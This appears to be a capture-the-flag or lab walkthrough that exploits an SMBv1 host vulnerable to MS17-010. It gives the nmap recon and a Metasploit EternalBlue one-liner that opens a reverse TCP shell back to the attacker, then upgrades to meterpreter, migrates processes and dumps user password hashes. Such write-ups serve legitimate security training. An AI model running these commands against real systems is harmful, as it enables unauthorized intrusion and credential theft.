## Recon  

**Set a terminal environmental variable for target IP address**  

```
export IP=<target-ip-address> 
```

**Run nmap services and vulnerabilities scan**  

```  
nmap -sV -vv --script=vuln $IP  
```

**Results**

> Host is vulnerable to Remote Code Execution vulnerability affecting Microsoft SMBv1 servers (ms17-010).  

More info:

## Exploit  

**Run msfconsole and perform reverse TCP shell exploit**
```  
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;setg RHOSTS $IP;setg LHOST tun0;run"  
```  

> We can set the RHOSTS, LHOST, and payload option for the script (RHOSTS and LHOST are set globally).  

**Metasploit go brrrr...**

 > Options have been set and exploit is now running.  

**Results**

  > Exploit initially failed, but eventually we get a reverse TCP shell.  

**Backgrounding the shell example**    

```  
background  
```  
  
> Ctrl-z does the same thing.

**Post-Exploit > Upgrade the reverse TCP shell to a meterpreter shell**  

**Search for the upgrade script**   
```
search upgrade shell   
```

**Select the script for use**  

```  
use shell_to_meterpreter  
```

  A Super l33t hax0r trick about upgrading shells is here...

**Set options for shell_to_meterpreter - The script needs the session ID of our reverse TCP shell**

**Run the script**

**Hmmm. Thats not working...**  
 
 For some reason, the script isn't upgrading our reverse TCP shell. No worries, a meterpreter shell is the default when a payload isn't set for the eternal blue exploit.

**Let's try again**  

```  
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;setg RHOSTS $IP;setg LHOST tun0;run"  
```  
 > This time we omit the "set payload windows/x64/shell/reverse_tcp" option. A meterpreter shell will be spun up by default. Also, we don't have to set the global variables again, but this is the handy initial one-liner to go back to and use, cause honestly the reverse TCP shell kinda sucks.

**Background the meterpreter session, then view sessions. We started with default meterpreter shell**

**Reconnect to the meterpreter session and list the current processes running on the target**

**Get process ID of current meterpreter shell**

**Migrate to another process and back. Grep is kinda broken...**

**Dump the user hashes**
